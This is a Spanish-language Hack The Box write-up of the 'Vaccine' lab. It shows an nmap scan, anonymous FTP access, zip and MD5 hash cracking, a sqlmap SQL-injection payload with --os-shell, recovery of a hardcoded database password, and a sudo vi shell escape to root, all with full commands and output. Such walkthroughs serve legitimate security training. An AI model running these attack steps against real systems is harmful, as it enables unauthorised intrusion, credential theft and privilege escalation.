---
title: Vaccine
date: 2025-08-5 23:00:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, vaccine, sqli, zip2john]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/4abda8d32b5c71e6905244988879c575.png
    alt: Hack The Box
---

## Task1

Besides SSH and HTTP, what other service is hosted on this box? 

Como ya es costumbre en los retos de HTB comenzamos con nmap para hacer el reconocimiento. 

``` shell
┌──(kali㉿kali25)-[~]
└─$ nmap -p- 10.129.243.181 -vv      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-01 20:03 CEST
Initiating Ping Scan at 20:03
Scanning 10.129.243.181 [4 ports]
Completed Ping Scan at 20:03, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:03
Completed Parallel DNS resolution of 1 host. at 20:03, 13.00s elapsed
Initiating SYN Stealth Scan at 20:03
Scanning 10.129.243.181 [65535 ports]
Discovered open port 21/tcp on 10.129.243.181
Discovered open port 80/tcp on 10.129.243.181
Discovered open port 22/tcp on 10.129.243.181
```

> ftp 


## Task2

This service can be configured to allow login with any password for specific username. What is that username? 
Conectamos al servicio ftp por supuesto como usuario anonymous

``` shell
┌──(kali㉿kali25)-[~]
└─$ ftp 10.129.243.181               
Connected to 10.129.243.181.
220 (vsFTPd 3.0.3)
Name (10.129.243.181:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10686|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10400|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |***************************************************************************************************************|  2533      387.65 KiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (46.01 KiB/s)
``` 

> anonymous

## Task3

What is the name of the file downloaded over this service? 
> backup.zip

## Task4

What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? 

```zip2john``` es un script que viene con John the ripper, genera un hash a partir de un archivo zip cifrado, en un formato que si puede ser crackeado.

``` shell
┌──(kali㉿kali25)-[~]
└─$ zip2john backup.zip > output
Created directory: /home/kali/.john
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(kali㉿kali25)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt output 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2025-08-01 20:29) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
> zip2john

## Task5

What is the password for the admin user on the website?

Ahora podemos descifrar el archivo de backup y ver el contenido de los archivos que contengan
``` shell                                                                                                  
┌──(kali㉿kali25)-[~]
└─$ unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css 

┌──(kali㉿kali25)-[~]
└─$ cat index.php 
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
```
Y el código de ```index.php``` encontramos el hash de la password que ```admin``` que debe utilizar para logearse. Toca hacer fuerza bruta para descifrarla.

``` shell
┌──(kali㉿kali25)-[~]
└─$ hashcat -m 0 2cb42f8734ea607eefed3b70af13bbd3 /usr/share/wordlists/rockyou.txt 
2cb42f8734ea607eefed3b70af13bbd3:qwerty789

```
>qwerty789

## Task6

What option can be passed to sqlmap to try to get command execution via the sql injection? 

Nos podemos logear con las credenciales obtenidas y vemos una web con un buscador parece un catálogo, según lo indicado deberíamos buscar un sqli. 

``` html
MegaCorp Car Catalogue
Elixir 	Sports 	Petrol 	2000cc
Sandy 	Sedan 	Petrol 	1000cc
Meta 	SUV 	Petrol 	800cc
Zeus 	Sedan 	Diesel 	1000cc
Alpha 	SUV 	Petrol 	1200cc
Canon 	Minivan 	Diesel 	600cc
Pico 	Sed 	Petrol 	750cc
Vroom 	Minivan 	Petrol 	800cc
Lazer 	Sports 	Diesel 	1400cc
Force 	Sedan 	Petrol 	600cc
```
Así que lanzamos sqlmap y vemos si conseguimos ejecutar el  ```--os-shell```
``` shell
┌──(kali㉿kali25)-[~]
└─$ sqlmap -u http://10.129.243.181/dashboard.php?search=MegaCorp --os-shell --flush-session --cookie="PHPSESSID=6vf4v6ojpk569pc630g0l416ea"
[21:52:34] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=MegaCorp';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=MegaCorp' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(120)||CHR(98)||CHR(112)||CHR(113))||(CHR(107)||CHR(75)||CHR(114)||CHR(75)||CHR(86)||CHR(71)||CHR(121)||CHR(101)||CHR(75)||CHR(102)||CHR(99)||CHR(97)||CHR(79)||CHR(120)||CHR(79)||CHR(75)||CHR(108)||CHR(78)||CHR(97)||CHR(87)||CHR(110)||CHR(90)||CHR(99)||CHR(114)||CHR(103)||CHR(102)||CHR(79)||CHR(108)||CHR(83)||CHR(109)||CHR(78)||CHR(99)||CHR(83)||CHR(102)||CHR(89)||CHR(76)||CHR(111)||CHR(99)||CHR(104)||CHR(112))||(CHR(113)||CHR(120)||CHR(107)||CHR(106)||CHR(113)),NULL,NULL-- zpIP
---
[21:52:43] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.04 or 19.10 or 20.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[21:52:44] [INFO] fingerprinting the back-end DBMS operating system
[21:52:44] [INFO] the back-end DBMS operating system is Linux
[21:52:44] [INFO] testing if current user is DBA
[21:52:45] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[21:52:45] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] 

command standard output: 'postgres'
os-shell> 
```
Hemos conseguido una shell y podemos ejecutar comandos 
> --os-shell

```  shell
os-shell> cat /var/www/html/dashboard.php
[22:38:27] [WARNING] the SQL query provided does not return any output
[22:38:27] [INFO] retrieved: 
No output

os-shell> echo $(cat /var/www/html/dashboard.php)
command standard output: '<!DOCTYPE html> <html lang=\"en\" > <head> <meta charset=\"UTF-8\"> <title>Admin Dashboard</title> <link rel=\"stylesheet\" href=\"./dashboard.css\"> <script src=\"https://use.fontawesome.com/33a3739634.js\"></script> </head> <body> <!-- partial:index.partial.html --> <body> <div id=\"wrapper\"> <div class=\"parent\"> <h1 align=\"left\">MegaCorp Car Catalogue</h1> <form action=\"\" method=\"GET\"> <div class=\"search-box\"> <input type=\"search\" name=\"search\" placeholder=\"Search\" /> <button type=\"submit\" class=\"search-btn\"><i class=\"fa fa-search\"></i></button> </div> </form> </div> <table id=\"keywords\" cellspacing=\"0\" cellpadding=\"0\"> <thead> <tr> <th><span style=\"color: white\">Name</span></th> <th><span style=\"color: white\">Type</span></th> <th><span style=\"color: white\">Fuel</span></th> <th><span style=\"color: white\">Engine</span></th> </tr> </thead> <tbody> <?php session_start(); if($_SESSION['login'] !== \"true\") { header(\"Location: index.php\"); die(); } try { $conn = pg_connect(\"host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!\"); } catch ( exception $e ) { echo $e->getMessage(); } if(isset($_REQUEST['search'])) { $q = \"Select PG_VERSION base global pg_commit_ts pg_dynshmem pg_logical pg_multixact pg_notify pg_replslot pg_serial pg_snapshots pg_stat pg_stat_tmp pg_subtrans pg_tblspc pg_twophase pg_wal pg_xact postgresql.auto.conf postmaster.opts postmaster.pid from cars where name ilike '%\". $_REQUEST[\"search\"] .\"%'\"; $result = pg_query($conn,$q); if (!$result) { die(pg_last_error($conn)); } while($row = pg_fetch_array($result, NULL, PGSQL_NUM)) { echo \" <tr> <td class='lalign'>$row[1]</td> <td>$row[2]</td> <td>$row[3]</td> <td>$row[4]</td> </tr>\"; } } else { $q = \"Select PG_VERSION base global pg_commit_ts pg_dynshmem pg_logical pg_multixact pg_notify pg_replslot pg_serial pg_snapshots pg_stat pg_stat_tmp pg_subtrans pg_tblspc pg_twophase pg_wal pg_xact postgresql.auto.conf postmaster.opts postmaster.pid from cars\"; $result = pg_query($conn,$q); if (!$result) { die(pg_last_error($conn)); } while($row = pg_fetch_array($result, NULL, PGSQL_NUM)) { echo \" <tr> <td class='lalign'>$row[1]</td> <td>$row[2]</td> <td>$row[3]</td> <td>$row[4]</td> </tr>\"; } } ?> </tbody> </table> </div> </body> <!-- partial --> <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script> <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script src=\"./dashboard.js\"></script> </body> </html>'

```

Intenté con ```sudo -l ``` para ver que comandos tenía disponible pero no tenía ninguna salida. Sin embargo podemos lidiar un poco con el terminal pues el comando anterior ```echo $(cat /var/www/html/dashboard.php) ``` no tendría mucho sentido en terminos de Bash pues cat ya hace eco, pero con este truco conseguí salvar el inconveniente y accedí a información importante para el reto, la password del usuario postgres

```user=postgres password=P@s5w0rd!```

## Task7
What program can the postgres user run as root using sudo? 

``` shell
os-shell> echo $(echo "P@s5w0rd!" | sudo -S -l)
command standard output: 'Matching Defaults entries for postgres on vaccine: env_keep+=\"LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET\", env_keep+=\"XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH\", secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, mail_badpass User postgres may run the following commands on vaccine: (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf'
```

Uso el mismo truco anterior para obtener los resultados esperados, pasar la password a sudo de esta forma es inseguro porque se podría ver en el history, no usen esta mala praxis, estamos atacando. 

> vi

Submit user flag

No podemos pedir usar vi con este terminal proporcionado por sqlmap, así que nos conectamos por SSH.

``` shell
┌──(kali㉿kali25)-[~]
└─$ ssh postgres@10.129.243.181
postgres@10.129.243.181's password: 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

postgres@vaccine:~$ find / -name user.txt 2> /dev/null
/var/lib/postgresql/user.txt
postgres@vaccine:~$ cat /var/lib/postgresql/user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```

Submit user flag 

Como en todos los retos buscamos user.txt para encontrar el user flag

> ec9b13ca4d6229cd************

## Submit root flag

Ahora podemos abusar de los permisos que nos han concedido para poder utilizar vi como vector de penetración.


``` shell
postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Como se puede usar vi para lanzar comandos estaríamos ejecutando binario con demasiadas capacidades y para más lo estamos lanzando privilegiado.

```:! cat /root/root.txt``` 

Dentro de vi ejecutamos ```:! cat /root/root.txt``` o el comando que queramos, tenemos privilegios. 

``` shell
Press ENTER or type command to continue
dd6e058e814260bc70e************
```

> dd6e058e814260bc************

Lanzamos el comando con sudo y ahora dirigiendo los comandos a descubrir el directorio de root y la flag

[achivement](https://labs.hackthebox.com/achievement/machine/2336390/289)